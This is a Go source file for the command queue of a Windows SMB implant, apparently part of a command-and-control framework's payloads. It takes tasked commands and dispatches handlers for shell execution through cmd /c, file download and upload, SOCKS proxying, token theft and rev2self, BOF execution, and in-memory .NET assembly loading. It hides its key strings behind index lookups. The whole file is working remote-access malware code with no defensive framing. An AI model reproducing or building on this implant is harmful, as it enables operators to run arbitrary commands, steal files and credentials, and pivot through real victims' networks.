// server/docker/payloads/SMB_Windows/command_queue.go
// Msg queue for SMB agent - core infrastructure only, handlers in action_*.go files

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"unicode"
)

// Msg queue template indices - must match server's common.go
const (
	idxCqWordWindows = 780 // windows
	idxCqShellCmd    = 781 // cmd
	idxCqShellCmdArg = 782 // /c
	idxCqShellSh     = 783 // sh
	idxCqShellShArg  = 784 // -c
	idxCqCmdDownload = 785 // download
	idxCqCmdUpload   = 786 // upload
)

// getCqStr gets command queue string from comms template
func getCqStr(idx int) string {
	return commsTpl(idx)
}

// WorkQueue manages the processing of commands
type WorkQueue struct {
	mu              sync.Mutex
	commands        []Msg
	cmdHandlers     map[int]OpHandler          // New: numeric ID dispatch
	cmdRegistry     map[string]OpIface     // Deprecated: kept for compatibility
	cmdContext      *OpCtx
	activeDownloads map[string]*FI
	activeUploads   map[string]*SI
	activeJobs      map[string]WI
}

// NewCommandQueue creates a new command queue instance
func NewCommandQueue() *WorkQueue {
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}

	ctx := &OpCtx{
		WorkingDir: currentDir,
		SessionEnv: make(map[string]string),
	}

	queue := &WorkQueue{
		commands:        make([]Msg, 0, 10),
		cmdHandlers:     make(map[int]OpHandler, 40),     // Numeric ID handlers
		cmdRegistry:     make(map[string]OpIface, 40), // Deprecated: kept for compatibility
		cmdContext:      ctx,
		activeDownloads: make(map[string]*FI, 4),
		activeUploads:   make(map[string]*SI, 4),
		activeJobs:      make(map[string]WI, 8),
	}

	// Register all commands using numeric IDs
	// Cross-platform commands (SMB_Windows subset)
	queue.registerHandler(CmdCd, wrapCommand(&ChDirMsg{}))
	queue.registerHandler(CmdLs, wrapCommand(&ListDirMsg{}))
	queue.registerHandler(CmdPwd, wrapCommand(&GetDirMsg{}))
	queue.registerHandler(CmdDownload, wrapCommand(&FM{}))
	queue.registerHandler(CmdUpload, wrapCommand(&SendMsg{}))
	queue.registerHandler(CmdShell, wrapCommand(&ExecMsg{}))
	queue.registerHandler(CmdSocks, wrapCommand(&ProxyMsg{}))
	queue.registerHandler(CmdSocksHTTP, wrapCommand(GetSocksHTTPHandler()))
	queue.registerHandler(CmdJobkill, wrapCommand(&WorkStopMsg{}))
	queue.registerHandler(CmdExit, wrapCommand(&QuitMsg{}))
	queue.registerHandler(CmdSleep, wrapCommand(&IntervalMsg{}))
	queue.registerHandler(CmdEnv, wrapCommand(&EnvMsg{}))
	queue.registerHandler(CmdCat, wrapCommand(&ReadFileMsg{}))
	queue.registerHandler(CmdHash, wrapCommand(&DigestMsg{}))
	queue.registerHandler(CmdHashDir, wrapCommand(&DigestDirMsg{}))
	queue.registerHandler(CmdPs, wrapCommand(&ProcListMsg{}))
	queue.registerHandler(CmdRm, wrapCommand(&RemoveMsg{}))
	queue.registerHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))

	// Windows specific commands
	queue.registerHandler(CmdToken, wrapCommand(&CredMsg{}))
	queue.registerHandler(CmdRev2self, wrapCommand(&AuthResetMsg{}))
	queue.registerHandler(CmdBof, wrapCommand(&TaskRunMsg{}))
	queue.registerHandler(CmdBofAsync, wrapCommand(&AsyncTaskMsg{}))
	queue.registerHandler(CmdBofJobs, wrapCommand(&JobListMsg{}))
	queue.registerHandler(CmdBofOutput, wrapCommand(&TaskOutputMsg{}))
	queue.registerHandler(CmdBofKill, wrapCommand(&JobStopMsg{}))
	queue.registerHandler(CmdInlineAssembly, wrapCommand(&NativeRunMsg{}))
	queue.registerHandler(CmdInlineAssemblyAsync, wrapCommand(&NativeAsyncMsg{}))
	queue.registerHandler(CmdInlineAssemblyJobs, wrapCommand(&NativeJobsMsg{}))
	queue.registerHandler(CmdInlineAssemblyOutput, wrapCommand(&NativeOutputMsg{}))
	queue.registerHandler(CmdInlineAssemblyKill, wrapCommand(&NativeStopMsg{}))
	queue.registerHandler(CmdInlineAssemblyJobsClean, wrapCommand(&NativeCleanMsg{}))
	queue.registerHandler(CmdInlineAssemblyJobsStats, wrapCommand(&NativeStatsMsg{}))

	// SMB link commands
	queue.registerHandler(CmdLink, wrapCommand(&RM{}))
	queue.registerHandler(CmdUnlink, wrapCommand(&DM{}))
	queue.registerHandler(CmdLinks, wrapCommand(&RLM{}))

	return queue
}

// registerHandler registers a command handler by numeric ID
func (cq *WorkQueue) registerHandler(id int, handler OpHandler) {
	cq.cmdHandlers[id] = handler
}

// wrapCommand converts a OpIface to a OpHandler function
func wrapCommand(cmd OpIface) OpHandler {
	return func(ctx *OpCtx, args []string) OpResult {
		return cmd.execute(ctx, args)
	}
}

// addCommands parses and adds commands to the queue
func (cq *WorkQueue) addCommands(jsonData string) error {
	var commands []Msg
	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
		return fmt.Errorf(Err(E18))
	}

	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.commands = append(cq.commands, commands...)
	return nil
}

// processNextCommand processes the next command in the queue
func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
	cq.mu.Lock()
	if len(cq.commands) == 0 {
		cq.mu.Unlock()
		return nil, nil
	}

	cmd := cq.commands[0]
	cq.commands = cq.commands[1:]
	cq.mu.Unlock()

	// Set the current command in context
	cq.cmdContext.mu.Lock()
	cq.cmdContext.CurrentMsg = &cmd
	cq.cmdContext.mu.Unlock()

	// Apply session environment variables
	cq.applySessionEnvironment()

	// Handle inline-assembly job management commands FIRST (by numeric ID)
	if cmd.CT == CmdInlineAssemblyJobs {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &OpResult{
				Cmd:     cmd,
				EStr: Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle inline-assembly-jobs-clean command
	if cmd.CT == CmdInlineAssemblyJobsClean {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-jobs-stats command
	if cmd.CT == CmdInlineAssemblyJobsStats {
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-output command WITH arguments
	if cmd.CT == CmdInlineAssemblyOutput {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly-kill command WITH arguments
	if cmd.CT == CmdInlineAssemblyKill {
		parts := strings.Fields(cmd.Cmd)
		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
			args := []string{}
			if len(parts) > 1 {
				args = parts[1:]
			}
			result := handler(cq.cmdContext, args)
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		}
	}

	// Handle inline-assembly commands WITH data (actual assembly execution)
	if (cmd.CT == CmdInlineAssembly || cmd.CT == CmdInlineAssemblyAsync) && cmd.Data != "" {
		var testParse map[string]interface{}
		_ = json.Unmarshal([]byte(cmd.Data), &testParse)

		handlerID := cmd.CT
		if handler, exists := cq.cmdHandlers[handlerID]; exists {
			result := handler(cq.cmdContext, []string{})
			result.Cmd = cmd
			result.Done = time.Now().Format(time.RFC3339)
			return &result, nil
		} else {
			return &OpResult{
				Cmd:     cmd,
				EStr: Err(E19),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
	}

	// Handle upload chunks
	if cmd.CT == CmdUpload && cmd.Data != "" {
		result, err := HandleUploadChunk(cmd, cq.cmdContext)
		if err != nil {
			return &OpResult{
				Cmd:     cmd,
				Error:       err,
				EStr: err.Error(),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}
		return result, nil
	}

	// Handle async BOF commands WITH data
	if cmd.CT == CmdBofAsync && cmd.Data != "" {
		result := cq.processBOFAsync(cmd)
		return &result, nil
	}

	// Handle regular BOF commands WITH data
	if cmd.CT == CmdBof && cmd.Data != "" {
		result := cq.processBOF(cmd)
		return &result, nil
	}

	// Handle download continuation
	if cmd.Filename != "" && cmd.CurrentChunk > 0 {
		cq.mu.Lock()
		downloadInfo, exists := cq.activeDownloads[cmd.Filename]
		cq.mu.Unlock()

		if !exists {
			return &OpResult{
				Cmd:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				EStr: Err(E4),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		if !downloadInfo.InProgress {
			return &OpResult{
				Cmd:     cmd,
				Error:       fmt.Errorf(Err(E4)),
				EStr: Err(E4),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		result, err := GetNextFileChunk(downloadInfo.FilePath, cmd.CurrentChunk, cmd)
		if err != nil {
			return &OpResult{
				Cmd:     cmd,
				Error:       err,
				EStr: err.Error(),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}, nil
		}

		cq.updateDownloadProgress(cmd.Filename, cmd.CurrentChunk)
		return result, nil
	}

	// Parse command
	var args []string
	cmdLower := strings.ToLower(strings.TrimSpace(cmd.Cmd))

	if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdDownload)) {
		args = parseDownloadCommand(cmd.Cmd)
	} else if strings.HasPrefix(cmdLower, getCqStr(idxCqCmdUpload)) {
		args = parseUploadCommand(cmd.Cmd)
	} else {
		args = parseCommandLine(cmd.Cmd)
	}

	if len(args) == 0 {
		return &OpResult{
			Cmd:     cmd,
			Error:       fmt.Errorf(Err(E1)),
			EStr: Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}, nil
	}

	cmdArgs := args[1:]

	// Look up command handler by numeric ID
	if handler, exists := cq.cmdHandlers[cmd.CT]; exists {
		result := handler(cq.cmdContext, cmdArgs)

		// For file operations, preserve data from handler
		if (cmd.CT == CmdDownload || cmd.CT == CmdUpload) &&
			(result.Cmd.Filename != "" || result.Cmd.Data != "") {
			result.Cmd.CID = cmd.CID
			result.Cmd.DID = cmd.DID
			result.Cmd.AID = cmd.AID
			result.Cmd.Timestamp = cmd.Timestamp
		} else {
			result.Cmd = cmd
		}

		result.Done = time.Now().Format(time.RFC3339)
		return &result, nil
	}

	// If no handler found, try to execute as shell command
	output, err := executeShellCommand(cmd.Cmd)
	if err != nil {
		return &OpResult{
			Cmd:     cmd,
			Output:      output,
			Error:       err,
			EStr: err.Error(),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}, nil
	}

	return &OpResult{
		Cmd:     cmd,
		Output:      output,
		EC:    0,
		Done: time.Now().Format(time.RFC3339),
	}, nil
}

// Helper function to apply session environment before executing any command
func (cq *WorkQueue) applySessionEnvironment() {
	cq.cmdContext.mu.RLock()
	if len(cq.cmdContext.SessionEnv) == 0 {
		cq.cmdContext.mu.RUnlock()
		return
	}
	defer cq.cmdContext.mu.RUnlock()

	for key, value := range cq.cmdContext.SessionEnv {
		os.Setenv(key, value)
	}
}

// executeShellCommand executes a command through the system shell
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == getCqStr(idxCqWordWindows) {
		cmd = exec.Command(getCqStr(idxCqShellCmd), getCqStr(idxCqShellCmdArg), command)
	} else {
		cmd = exec.Command(getCqStr(idxCqShellSh), getCqStr(idxCqShellShArg), command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// parseCommandLine properly handles quoted arguments and spaces in paths
func parseCommandLine(cmdLine string) []string {
	args := make([]string, 0, 8)
	var current strings.Builder
	current.Grow(64)
	var inQuote rune
	var escaped bool

	for _, r := range cmdLine {
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}

		if r == '\\' {
			if inQuote != 0 {
				escaped = true
				continue
			}
			current.WriteRune(r)
			continue
		}

		if inQuote != 0 {
			if r == inQuote {
				inQuote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}

		if r == '"' || r == '\'' {
			inQuote = r
			continue
		}

		if unicode.IsSpace(r) {
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
			continue
		}

		current.WriteRune(r)
	}

	if current.Len() > 0 {
		args = append(args, current.String())
	}

	return args
}

// parseDownloadCommand specifically handles the download command
func parseDownloadCommand(cmdLine string) []string {
	cmdLine = strings.TrimSpace(cmdLine)

	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdDownload)) {
		return parseCommandLine(cmdLine)
	}

	if len(cmdLine) <= 8 {
		return []string{getCqStr(idxCqCmdDownload)}
	}

	if cmdLine[8] != ' ' && cmdLine[8] != '\t' {
		return parseCommandLine(cmdLine)
	}

	remainder := strings.TrimSpace(cmdLine[8:])

	if remainder == "" {
		return []string{getCqStr(idxCqCmdDownload)}
	}

	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{getCqStr(idxCqCmdDownload), remainder}
}

// parseUploadCommand specifically handles the upload command
func parseUploadCommand(cmdLine string) []string {
	cmdLine = strings.TrimSpace(cmdLine)

	if !strings.HasPrefix(strings.ToLower(cmdLine), getCqStr(idxCqCmdUpload)) {
		return parseCommandLine(cmdLine)
	}

	if len(cmdLine) <= 6 {
		return []string{getCqStr(idxCqCmdUpload)}
	}

	if cmdLine[6] != ' ' && cmdLine[6] != '\t' {
		return parseCommandLine(cmdLine)
	}

	remainder := strings.TrimSpace(cmdLine[6:])

	if remainder == "" {
		return []string{getCqStr(idxCqCmdUpload)}
	}

	if (strings.HasPrefix(remainder, "\"") && strings.HasSuffix(remainder, "\"")) ||
		(strings.HasPrefix(remainder, "'") && strings.HasSuffix(remainder, "'")) {
		remainder = remainder[1 : len(remainder)-1]
	}

	return []string{getCqStr(idxCqCmdUpload), remainder}
}

// Download/Upload tracking methods are in job_manager.go
